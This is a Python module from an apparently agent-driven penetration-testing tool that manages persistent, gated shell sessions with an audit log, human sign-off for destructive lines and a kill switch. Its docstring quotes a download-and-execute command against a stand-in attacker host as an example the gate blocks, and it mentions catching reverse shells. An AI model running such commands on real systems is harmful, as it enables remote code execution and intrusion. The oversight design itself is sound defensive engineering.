"""
sessions.py — the multi-session manager: several governed live shells that survive
across loop turns (Phase 2, the capability unlock).

Until now Brukal's execution model was one-shot: propose a command, run it, read the
output, forget everything. That is a hard ceiling on finishing a box — you cannot
`cd`, set an env var, catch a reverse shell, or run a privesc chain that depends on
prior state. A live session removes that ceiling by holding a persistent interactive
shell inside the cage whose state (cwd, exported vars, background jobs) survives from
one loop turn to the next.

The capability lives ABOVE the gate; enforcement stays below it. EVERY line written
into a session goes through `GovernedSession.send` -> `Gate.check_session` -> the
hash-chained audit log, BEFORE it reaches the backend. A session is NOT an
authorisation to run ungated input:

  * scope containment is absolute — an out-of-scope host anywhere in the line (even
    behind a pipe, e.g. `curl http://evil.com/x | sh`) is DENIED and never reaches
    the shell, so a session can't be used to pivot off the authorised target;
  * a destructive/irreversible line ESCALATEs for human sign-off (fail-closed
    approver — no sign-off, not run);
  * empty/ambiguous input is denied; a write to an unknown/closed/reaped session
    fails closed to DENY rather than being routed anywhere.

This is the same deterministic, no-LLM `check_session` policy the shipped `brukal
shell` uses; the manager adds statefulness and lifecycle, never a gate exception.

Lifecycle handled here: open/close, multiple concurrent independent sessions, an
idle timeout, orphan reaping when a backend dies unexpectedly, and a hard
`close_all` kill switch. Per-session state (target, line count, transcript digest,
open/closed/orphaned) is mirrored out via an `on_state` callback so a resumed
engagement can see what each shell did.

Standard library only.
"""
from __future__ import annotations

import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from .audit import AuditLog
from .gate import Decision, Gate
from .kali import ExecResult
from .session import GovernedSession


@dataclass
class SessionState:
    """The mirrored, inspectable state of one live session (no backend handle)."""
    sid: int
    target: str
    opened_at: float
    last_activity: float
    lines: int = 0                      # gated lines sent (ALLOW/ESCALATE-approved)
    denied: int = 0                     # lines the gate refused
    closed: bool = False
    orphaned: bool = False              # backend died unexpectedly (vs a clean close)
    transcript: list = field(default_factory=list)   # (line, verdict, returncode)

    @property
    def idle(self) -> float:
        return time.time() - self.last_activity

    @property
    def age(self) -> float:
        return time.time() - self.opened_at


class SessionManager:
    """Owns a set of concurrent GovernedSessions keyed by a small integer id.

    Every write is gated by the GovernedSession it routes to; the manager itself never
    talks to a backend except to construct/close one. Thread-safe: a manager lock
    guards id assignment and the state maps, and each session has its own lock so
    concurrent sends to DIFFERENT sessions run in parallel while sends to the SAME
    session are serialised (a shared stdin can't be interleaved). The backend read may
    block up to its own timeout, so it runs OUTSIDE the manager lock.
    """

    def __init__(self, gate: Gate, audit: AuditLog, *,
                 backend_factory: Callable[[str], object],
                 approver: Optional[Callable[[Decision], bool]] = None,
                 max_sessions: int = 8, idle_timeout: float = 1800.0,
                 on_state: Optional[Callable[[SessionState], None]] = None):
        self._gate = gate
        self._audit = audit
        self._factory = backend_factory       # (target) -> FakeSession | DockerSession
        self._approver = approver or (lambda _d: False)   # fail-closed default
        self.max_sessions = max_sessions
        self.idle_timeout = idle_timeout
        self._on_state = on_state
        self._sessions: dict[int, GovernedSession] = {}
        self._locks: dict[int, threading.Lock] = {}
        self._states: dict[int, SessionState] = {}
        self._next = 1
        self.current_id: Optional[int] = None
        self._lock = threading.RLock()

    # -- persistence hook --------------------------------------------------- #

    def _persist(self, st: SessionState) -> None:
        if self._on_state is not None:
            try:
                self._on_state(st)
            except Exception:
                pass                          # mirroring state must never break a session

    # -- inspection --------------------------------------------------------- #

    def state(self, sid: int) -> Optional[SessionState]:
        return self._states.get(sid)

    def states(self) -> list[SessionState]:
        with self._lock:
            return list(self._states.values())

    def open_ids(self) -> list[int]:
        with self._lock:
            return [sid for sid, st in self._states.items() if not st.closed]

    def alive(self, sid: int) -> bool:
        gs = self._sessions.get(sid)
        st = self._states.get(sid)
        return bool(gs is not None and st is not None and not st.closed
                    and getattr(gs, "alive", False))

    # -- lifecycle ---------------------------------------------------------- #

    def open(self, target: str) -> int:
        """Open a new governed live shell on `target` (which must already be the
        authorised engagement target — the box passed the normal gate to get here).
        Becomes the current session. Raises if the concurrent-session cap is reached."""
        with self._lock:
            self._reap_locked()
            if len(self.open_ids()) >= self.max_sessions:
                raise RuntimeError(
                    f"session limit reached ({self.max_sessions} open) — close one first")
            sid = self._next
            self._next += 1
            backend = self._factory(target)
            gs = GovernedSession(self._gate, backend, self._audit, target,
                                 approver=self._approver)
            now = time.time()
            st = SessionState(sid=sid, target=target, opened_at=now, last_activity=now)
            self._sessions[sid] = gs
            self._locks[sid] = threading.Lock()
            self._states[sid] = st
            self.current_id = sid
            self._audit.append("session_open", {"sid": sid, "target": target})
            self._persist(st)
            return sid

    def send(self, sid: int, line: str, agent: str = "operator"):
        """Send one line into session `sid`, gated + logged. Returns
        (Decision, ExecResult | None). A write to an unknown/closed/reaped session
        fails closed to DENY and reaches no backend."""
        with self._lock:
            self._reap_locked()
            gs = self._sessions.get(sid)
            st = self._states.get(sid)
            slock = self._locks.get(sid)
            if gs is None or st is None or st.closed or slock is None:
                target = st.target if st is not None else ""
                dec = Decision("DENY", line, target, agent,
                               f"no live session #{sid} (closed, reaped, or never opened)",
                               "session:closed")
                self._audit.append("session_decision", dec)   # the refusal is on the ledger
                return dec, None
        # Route to the GovernedSession OUTSIDE the manager lock (the backend read can
        # block up to its timeout); serialise only this one session via its own lock.
        with slock:
            decision, result = gs.send(line, agent=agent)
        with self._lock:
            st.last_activity = time.time()
            if result is not None:
                st.lines += 1
                st.transcript.append((line, decision.verdict,
                                      getattr(result, "returncode", 0)))
            elif decision.verdict == "DENY":
                st.denied += 1
                st.transcript.append((line, decision.verdict, None))
            # A backend that died on this send (EOF / broken pipe) is now orphaned.
            if not getattr(gs, "alive", False) and not st.closed:
                st.closed = True
                st.orphaned = True
                self._audit.append("session_reap", {"sid": sid, "reason": "died"})
                if self.current_id == sid:
                    self.current_id = self._pick_current_locked()
            self._persist(st)
            return decision, result

    def close(self, sid: int) -> None:
        with self._lock:
            gs = self._sessions.get(sid)
            st = self._states.get(sid)
            if gs is None or st is None or st.closed:
                return
            try:
                gs.close()
            except Exception:
                pass
            st.closed = True
            self._audit.append("session_close", {"sid": sid})
            if self.current_id == sid:
                self.current_id = self._pick_current_locked()
            self._persist(st)

    def close_all(self) -> None:
        """Hard kill switch — close every open session at once. Used at the end of a
        run and by the Phase-3 emergency stop; leaves no orphaned cage processes."""
        with self._lock:
            for sid in list(self._sessions.keys()):
                gs = self._sessions[sid]
                st = self._states[sid]
                if st.closed:
                    continue
                try:
                    gs.close()
                except Exception:
                    pass
                st.closed = True
                self._audit.append("session_close", {"sid": sid, "reason": "close_all"})
                self._persist(st)
            self.current_id = None

    # -- reaping ------------------------------------------------------------ #

    def reap(self) -> list[int]:
        """Close sessions whose backend has died or that have been idle past the
        timeout. Returns the ids reaped. Safe to call any time."""
        with self._lock:
            return self._reap_locked()

    def _reap_locked(self) -> list[int]:
        reaped: list[int] = []
        for sid, gs in list(self._sessions.items()):
            st = self._states.get(sid)
            if st is None or st.closed:
                continue
            dead = not getattr(gs, "alive", False)
            idle_out = st.idle > self.idle_timeout
            if not (dead or idle_out):
                continue
            try:
                gs.close()
            except Exception:
                pass
            st.closed = True
            st.orphaned = dead and not idle_out
            self._audit.append("session_reap",
                               {"sid": sid, "reason": "died" if dead else "idle"})
            if self.current_id == sid:
                self.current_id = self._pick_current_locked()
            self._persist(st)
            reaped.append(sid)
        return reaped

    def _pick_current_locked(self) -> Optional[int]:
        for sid, st in self._states.items():
            if not st.closed:
                return sid
        return None
